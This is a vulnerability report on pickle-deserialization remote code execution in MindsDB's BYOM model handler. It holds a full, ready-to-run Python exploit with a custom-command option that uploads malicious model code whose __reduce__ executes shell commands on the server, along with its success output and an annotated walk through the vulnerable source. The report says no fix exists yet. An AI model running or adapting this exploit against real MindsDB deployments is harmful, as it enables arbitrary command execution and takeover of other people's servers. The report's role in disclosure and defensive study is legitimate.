# MindsDB Pickle Deserialization Remote Code Execution Vulnerability Analysis

## Vulnerability Description

MindsDB is an open-source AI SQL Server that allows developers to train and deploy machine learning models through SQL interface. Its BYOM (Bring Your Own Model) feature allows users to upload custom Python model code.

This report analyzes a Pickle deserialization remote code execution vulnerability in the MindsDB BYOM Handler. The vulnerability allows attackers to inject objects with malicious `__reduce__()` methods during model training, which then trigger arbitrary code execution during model prediction via `pickle.loads()`.


## Environment Setup

```bash
# 1. Clone vulnerable source code
git clone https://github.com/mindsdb/mindsdb.git
cd mindsdb
git checkout vulnerable-25.11.0

# 2. Install dependencies
pip install -r requirements.txt

# 3. Start MindsDB service
python -m mindsdb
```

The service listens on `http://127.0.0.1:47334` by default.

## Vulnerability Reproduction

Since there are many steps involved in reproduction, a script is used for exploitation.

### Attack Flow Overview

```
1. PUT /api/handlers/byom/<engine_name>
   └─→ Upload malicious BYOM handler code

2. CREATE MODEL <model_name>
   └─→ FROM <engine_name>
   └─→ Triggers train() → pickle.dumps(malicious object)
   └─→ Model state persisted to storage

3. SELECT * FROM <model_name> WHERE ...
   └─→ Triggers predict() → pickle.loads(model_state)
   └─→ __reduce__() → Arbitrary Code Execution
```

### Complete HTTP API Exploit Script

```python
import requests
import time
import os
import sys
import tempfile

TARGET = "http://127.0.0.1:47334"

# Malicious pickle payload - __reduce__ executes automatically during pickle.loads()
# Note: Second parameter must be a tuple
MALICIOUS_CODE = """
import subprocess

class PickleRCE:
    def __reduce__(self):
        # Command executed during deserialization
        marker = "/tmp/MINDSDB_PICKLE_RCE"
        return (
            subprocess.run,
            (['sh', '-c', f'echo "PICKLE_RCE_SUCCESS_$(date)" > {marker} && whoami >> {marker}'],)
        )

class ExploitModel:
    def train(self, df, target, args=None):
        # Key: Inject malicious object into self.__dict__
        # This will be serialized during pickle.dumps()
        self.__dict__['evil'] = PickleRCE()
        self.__dict__['trained'] = True
        return None

    def predict(self, df, args=None):
        return df
"""

REQUIREMENTS = "pandas\n"

def exploit(target_url, command=None):
    """Execute Pickle RCE exploit"""

    if command:
        # Custom command
        MALICIOUS_CODE_CUSTOM = f"""
import subprocess

class PickleRCE:
    def __reduce__(self):
        return (
            subprocess.run,
            (['sh', '-c', '{command}'],)
        )

class ExploitModel:
    def train(self, df, target, args=None):
        self.__dict__['evil'] = PickleRCE()
        return None

    def predict(self, df, args=None):
        return df
"""
        code = MALICIOUS_CODE_CUSTOM
    else:
        code = MALICIOUS_CODE

    # Step 1: Clean up old resources
    print("[*] Step 1: Cleaning up old resources...")
    requests.post(f"{target_url}/api/sql/query",
        json={"query": "DROP MODEL IF EXISTS exploit_model"},
        timeout=60)
    requests.post(f"{target_url}/api/sql/query",
        json={"query": "DROP ML_ENGINE IF EXISTS exploit_engine"},
        timeout=60)
    time.sleep(1)

    # Step 2: Upload malicious BYOM handler via PUT (direct upload, no local files needed)
    print("[*] Step 2: PUT /api/handlers/byom/exploit_engine ...")

    # Create temporary files for upload
    temp_dir = tempfile.mkdtemp()
    code_path = os.path.join(temp_dir, "model.py")
    req_path = os.path.join(temp_dir, "requirements.txt")

    with open(code_path, 'w') as f:
        f.write(code)
    with open(req_path, 'w') as f:
        f.write(REQUIREMENTS)

    try:
        with open(code_path, 'rb') as code_file, open(req_path, 'rb') as req_file:
            files = {
                'code': ('model.py', code_file, 'text/plain'),
                'modules': ('requirements.txt', req_file, 'text/plain'),
            }
            data = {'type': 'inhouse'}

            resp = requests.put(
                f"{target_url}/api/handlers/byom/exploit_engine",
                files=files,
                data=data,
                timeout=60
            )

        print(f"    Status: {resp.status_code}")
        if resp.status_code == 200:
            print(f"    [+] BYOM handler uploaded successfully!")
        else:
            print(f"    [-] Failed: {resp.text[:200]}")
            return False
    finally:
        # Cleanup temporary files
        import shutil
        shutil.rmtree(temp_dir, ignore_errors=True)

    time.sleep(2)

    # Step 3: CREATE MODEL - triggers train() → pickle.dumps()
    print("[*] Step 3: CREATE MODEL (triggers train to inject payload)...")
    query_model = """
    CREATE MODEL exploit_model
    FROM files
    (SELECT * FROM test_18 LIMIT 5)
    PREDICT content
    USING engine = 'exploit_engine'
    """

    resp = requests.post(f"{target_url}/api/sql/query",
        json={"query": query_model}, timeout=120)
    print(f"    Status: {resp.status_code} - {resp.json().get('type')}")

    # Wait for training completion
    print("    Waiting for training completion...")
    for i in range(10):
        time.sleep(1)
        resp_check = requests.post(f"{target_url}/api/sql/query",
            json={"query": "SELECT status FROM models WHERE name = 'exploit_model'"},
            timeout=60)
        result = resp_check.json()
        if result.get('type') == 'table' and result.get('data'):
            status = result['data'][0][0]
            if status == 'complete':
                print(f"    Training complete (status: {status})")
                break
            elif status == 'error':
                print(f"    Training failed (status: {status})")
                return False

    # Step 4: SELECT ... WHERE - triggers predict() → pickle.loads() → RCE
    print("[*] Step 4: SELECT ... WHERE (triggers pickle.loads RCE)...")
    query_pred = "SELECT * FROM exploit_model WHERE content = 'test'"

    resp = requests.post(f"{target_url}/api/sql/query",
        json={"query": query_pred}, timeout=120)
    print(f"    Status: {resp.status_code} - {resp.json().get('type')}")

    time.sleep(2)

    # Step 5: Verify RCE
    print("[*] Step 5: Verifying RCE...")
    if not command:
        marker = "/tmp/MINDSDB_PICKLE_RCE"
        if os.path.exists(marker):
            with open(marker) as f:
                content = f.read()
            print(f"\n[!] ================== RCE SUCCESS! ==================")
            print(f"{content.strip()}")
            print(f"====================================================\n")
            return True
    else:
        print(f"\n[!] Command executed: {command}")

    print("[-] RCE not detected (payload may have executed but marker file not found)")
    return False

def main():
    import argparse
    parser = argparse.ArgumentParser(description='MindsDB BYOM Pickle RCE Exploit')
    parser.add_argument('-t', '--target', default=TARGET, help='Target URL')
    parser.add_argument('-c', '--command', help='Custom command to execute')
    args = parser.parse_args()

    print("=" * 60)
    print("MindsDB BYOM Pickle RCE Exploit")
    print("=" * 60)

    try:
        # Check service
        resp = requests.get(f"{args.target}/api/databases/", timeout=5)
        if resp.status_code != 200:
            print("[-] MindsDB service not responding")
            return
        print(f"[+] MindsDB service running: {args.target}")
    except Exception as e:
        print(f"[-] Cannot connect: {e}")
        return

    exploit(args.target, args.command)

if __name__ == "__main__":
    main()
```

### Execution Output

![](https://gitee.com/nn0nkey/picture/raw/master/img/20260114215217296.png)

```
============================================================
MindsDB BYOM Pickle RCE Exploit
============================================================
[+] MindsDB service running: http://127.0.0.1:47334
[*] Step 1: Cleaning up old resources...
[*] Step 2: PUT /api/handlers/byom/exploit_engine ...
    Status: 200
    [+] BYOM handler uploaded successfully!
[*] Step 3: CREATE MODEL (triggers train to inject payload)...
    Status: 200 - table
    Waiting for training completion...
    Training complete (status: complete)
[*] Step 4: SELECT ... WHERE (triggers pickle.loads RCE)...
    Status: 200 - table
[*] Step 5: Verifying RCE...

[!] ================== RCE SUCCESS! ==================
PICKLE_RCE_SUCCESS_Wed Jan 14 21:47:39 CST 2026
liaojialin.6
====================================================
```

## Vulnerability Analysis

---

### Detailed Code Analysis

#### Model Proxy Retrieval

```python
def _get_model_proxy(self, version=None):
    """
    Get the corresponding model wrapper based on version
    Returns ModelWrapperUnsafe or ModelWrapperSafe
    """
    if version is None:
        version = 1
    if isinstance(version, str):
        version = int(version)
    version_mark = ""
    if version > 1:
        version_mark = f"_{version}"
    version_str = str(version)

    # Get user-uploaded code and dependencies from storage
    self.engine_storage.fileStorage.pull()
    try:
        code = self.engine_storage.fileStorage.file_get(f"code{version_mark}")
        modules_str = self.engine_storage.fileStorage.file_get(f"modules{version_mark}")
    except FileNotFoundError:
        raise Exception(f"Engine version '{version}' does not exists")

    # Select wrapper type based on version configuration
    if version_str not in self.model_wrappers:
        connection_args = self.engine_storage.get_connection_args()
        version_meta = connection_args["versions"][version_str]

        try:
            engine_version_type = BYOM_TYPE[version_meta.get("type", self._default_byom_type.name).upper()]
        except KeyError:
            raise Exception("Unknown BYOM_TYPE")

        # 🔴 Critical branch: Select wrapper based on engine_version_type
        if engine_version_type == BYOM_TYPE.INHOUSE:
            if self._inhouse_enabled is False:
                raise Exception("'Inhouse' BYOM engine type can not be used")
            # Create dangerous ModelWrapperUnsafe
            if self.inhouse_model_wrapper is None:
                self.inhouse_model_wrapper = ModelWrapperUnsafe(
                    code=code,              # ← User-uploaded code
                    modules_str=modules_str,
                    engine_id=self.engine_storage.integration_id,
                    engine_version=version,
                )
            self.model_wrappers[version_str] = self.inhouse_model_wrapper

        elif engine_version_type == BYOM_TYPE.VENV:
            # Create safe ModelWrapperSafe (uses subprocess isolation)
            self.model_wrappers[version_str] = ModelWrapperSafe(
                code=code,
                modules_str=modules_str,
                engine_id=self.engine_storage.integration_id,
                engine_version=version,
            )

    return self.model_wrappers[version_str]
```

- When BYOM type is `INHOUSE`, a `ModelWrapperUnsafe` instance is created, which processes user code directly in the main process and uses pickle for serialization/deserialization

---

#### ModelWrapperUnsafe Class

```python
class ModelWrapperUnsafe:
    """Model wrapper that executes learn/predict in current process"""

    def __init__(self, code, modules_str, engine_id, engine_version: int):
        # Import user-provided code
        self.module = import_string(code)

        model_instance = None
        # Find class containing train and predict methods in user code
        model_class = find_model_class(self.module)
        if model_class is not None:
            model_instance = model_class()

        self.model_instance = model_instance

    def train(self, df, target, args):
        """
        Train model - 🔴 Vulnerability injection point
        """
        # Call user-provided train() method
        # We can modify self.__dict__ here to inject malicious objects
        self.model_instance.train(df, target, args)

        # 🔴 Vulnerability: Direct serialization of controllable __dict__
        # User can modify __dict__ in train() to add malicious objects with __reduce__
        return pickle.dumps(self.model_instance.__dict__, protocol=5)

    def predict(self, df, model_state, args):
        """
        Predict - 🔴 Vulnerability trigger point
        """
        # 🔴 Vulnerability: Unsafe deserialization
        # model_state comes from storage, but content is controlled by user during train()
        model_state = pickle.loads(model_state)

        # Restore deserialized data to model instance
        self.model_instance.__dict__ = model_state

        try:
            result = self.model_instance.predict(df, args)
        except Exception:
            result = self.model_instance.predict(df)
        return result

    def finetune(self, df, model_state, args):
        """
        Fine-tune model - 🔴 Same pickle deserialization vulnerability
        """
        # 🔴 Vulnerability: Unsafe deserialization
        self.model_instance.__dict__ = pickle.loads(model_state)

        call_args = [df]
        if args:
            call_args.append(args)

        self.model_instance.finetune(df, args)

        # Serialize again
        return pickle.dumps(self.model_instance.__dict__, protocol=5)

    def describe(self, model_state, attribute: Optional[str] = None) -> pd.DataFrame:
        """
        Describe model - 🔴 Same pickle deserialization vulnerability
        """
        if hasattr(self.model_instance, "describe"):
            # 🔴 Vulnerability: Unsafe deserialization
            model_state = pickle.loads(model_state)
            self.model_instance.__dict__ = model_state
            return self.model_instance.describe(attribute)
        return pd.DataFrame()

    def func_call(self, func_name, args):
        """Call custom function"""
        func = getattr(self.module, func_name)
        return func(*args)

    def check(self, mode: str = None):
        """Check module"""
        methods = check_module(self.module, mode)
        return methods
```

There are many deserialization points - anywhere that calls `pickle.loads` is a vulnerability, because we can rewrite this class and override any of its methods, meaning parameters are completely under our control.

The `train` method does `return pickle.dumps(self.model_instance.__dict__, protocol=5)`, which directly serializes `model_instance.__dict__`, so our PoC modifies `self.__dict__` to inject malicious objects.

The other points are deserialization - the core is `pickle.loads`, but the key is whether there's an API that can trigger these methods.

---

#### proc_wrapper Processing

```python
def encode(obj):
    """Serialize object using pickle"""
    return pickle.dumps(obj, protocol=5)


def decode(encoded):
    """Deserialize object using pickle - 🔴 Unsafe"""
    return pickle.loads(encoded)


def return_output(obj):
    # Write serialized object to stdout
    encoded = encode(obj)
    with open(1, 'wb') as fd:
        fd.write(encoded)
    sys.exit(0)


def get_input():
    # Read and deserialize object from stdin
    with open(0, 'rb') as fd:
        encoded = fd.read()
        obj = decode(encoded)  # ← Direct deserialization
    return obj
```

Communication uses serialized and deserialized data, calling encode and decode.

---

#### TRAIN Processing Logic

```python
def main():
    # Replace stdout with stderr
    sys.stdout = sys.stderr

    params = get_input()  # Read parameters from stdin

    method = BYOM_METHOD(params['method'])
    code = params['code']

    # Import user code
    module = import_string(code)

    # ... other branches omitted ...

    model_class = find_model_class(module)

    if method == BYOM_METHOD.TRAIN:
        df = params['df']
        if df is not None:
            df = pd_decode(df)
        to_predict = params['to_predict']
        args = params['args']
        model = model_class()

        call_args = [df, to_predict]
        if args:
            call_args.append(args)

        # 🔴 Call user-provided train() method - user can modify __dict__ here
        model.train(*call_args)

        # 🔴 Serialize entire model.__dict__ and return
        data = model.__dict__

        model_state = encode(data)  # pickle.dumps()
        return_output(model_state)
```

This calls the `train()` method of our uploaded malicious model, then gets the model's `__dict__` and serializes it using `encode()`, which is `pickle.dumps()`.

---

#### PREDICT Processing Logic

Our data is only serialized, not yet deserialized. As seen above, there are many load methods in the class, such as predict.

```python
elif method == BYOM_METHOD.PREDICT:
    model_state = params['model_state']  # Get model_state from parameters

    df = pd_decode(params['df'])
    args = params['args']

    model = model_class()

    # 🔴 Vulnerability: Deserialize model_state
    model.__dict__ = decode(model_state)  # pickle.loads() - triggers __reduce__()

    call_args = [df]
    if args:
        call_args.append(args]

    # Execute predict
    res = model.predict(*call_args)
    return_output(pd_encode(res))
```

This uses `decode()`, which is `pickle.loads()`, to deserialize `model_state`. When `model_state` contains a malicious object with `__reduce__()` method, the code in that object is automatically executed.

---

#### How to Trigger These Methods?

##### BYOMHandler.create() Method

```python
def create(self, target, df=None, args=None, **kwargs):
    """
    Create model - corresponds to SQL: CREATE MODEL ...
    """
    using_args = args.get("using", {})
    engine_version = using_args.get("engine_version")

    # Get model proxy (ModelWrapperUnsafe or ModelWrapperSafe)
    model_proxy = self._get_model_proxy(engine_version)

    model_state = model_proxy.train(df, target, args)

    # Store model_state to file system
    self.model_storage.file_set("model", model_state)

    # Set column information
    def convert_type(field_type):
        if pd_types.is_integer_dtype(field_type):
            return "integer"
        elif pd_types.is_numeric_dtype(field_type):
            return "float"
        elif pd_types.is_datetime64_any_dtype(field_type):
            return "datetime"
        else:
            return "categorical"

    columns = {target: convert_type(object)}
    self.model_storage.columns_set(columns)
```

When create method is called, `model_proxy.train()` returns `model_state`, which is stored and later read and deserialized during `predict()`.

---

##### BYOMHandler.predict()

**File Location:** `mindsdb/integrations/handlers/byom_handler/byom_handler.py:228-241`

```python
def predict(self, df, args=None):
    """
    Predict - corresponds to SQL: SELECT * FROM model ...
    """
    pred_args = args.get("predict_params", {})

    engine_version = pred_args.get("engine_version")
    if engine_version is not None:
        engine_version = int(engine_version)
    else:
        engine_version = self.get_model_engine_version()

    # Get model proxy
    model_proxy = self._get_model_proxy(engine_version)

    # 🔴 Read model_state from storage
    model_state = self.model_storage.file_get("model")

    # 🔴 Call predict() - pass model_state, triggers pickle.loads()
    pred_df = model_proxy.predict(df, model_state, pred_args)

    return pred_df
```

When SELECT is called, model_state is read from storage and passed to predict() - which triggers pickle.loads().

---

### Attack Principle Explained

#### Python Pickle Deserialization Mechanism

Python's `pickle` module automatically calls special methods on objects during deserialization. The `__reduce__()` method returns a tuple `(callable, args)`, and pickle executes `callable(*args)`.

```python
# Normal usage
class Data:
    def __reduce__(self):
        return (dict, ([('key', 'value')],))

# Malicious usage
class Malicious:
    def __reduce__(self):
        return (os.system, ('whoami',))  # Execute command
```

#### Attacker Control Path

Attackers can modify `self.__dict__` in the `train()` method:

```python
def train(self, df, target, args=None):
    # Create malicious object
    class MaliciousObject:
        def __reduce__(self):
            return (subprocess.run, (['evil_command'],))

    # Inject malicious object into instance dictionary
    self.__dict__['malicious'] = MaliciousObject()
```

When `pickle.dumps(model.__dict__)` is called, the `malicious` object in `__dict__` gets serialized. Later when `pickle.loads()` is called, `MaliciousObject.__reduce__()` is automatically executed.

#### Complete Attack Flow

```
1. User uploads malicious model code
   │
   ↓
2. CREATE MODEL (calls BYOMHandler.create)
   │
   ├─→ _get_model_proxy() returns ModelWrapperUnsafe
   │
   ├─→ ModelWrapperUnsafe.train() is called
   │   │
   │   ├─→ self.model_instance.train(df, target, args)
   │   │   │
   │   │   └─→ User code executes:
   │   │       self.__dict__['evil'] = MaliciousObject()
   │   │
   │   └─→ pickle.dumps(self.model_instance.__dict__)
   │       Contains malicious object
   │
   └─→ model_storage.file_set("model", model_state)
       Store to file system
   │
   ↓
3. SELECT ... (calls BYOMHandler.predict)
   │
   ├─→ model_state = model_storage.file_get("model")
   │   Read data containing malicious object
   │
   ├─→ ModelWrapperUnsafe.predict(df, model_state, args)
   │   │
   │   └─→ pickle.loads(model_state)  ← Vulnerability trigger point
   │       │
   │       └─→ MaliciousObject.__reduce__()
   │           │
   │           └─→ subprocess.run(['evil_command'])  ← RCE
```

---

## Vulnerability Fix

As this is a newly discovered vulnerability, no official fix is available yet.

## References

- [MindsDB GitHub Repository](https://github.com/mindsdb/mindsdb)
- [Python Pickle Documentation - Security Considerations](https://docs.python.org/3/library/pickle.html#restricting-globals)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)

## Disclaimer

This report is for security research and educational purposes only. All testing was conducted in authorized environments.

- Do not use the information provided herein for any illegal purposes
- The exploitation methods described are intended to help understand and fix security vulnerabilities
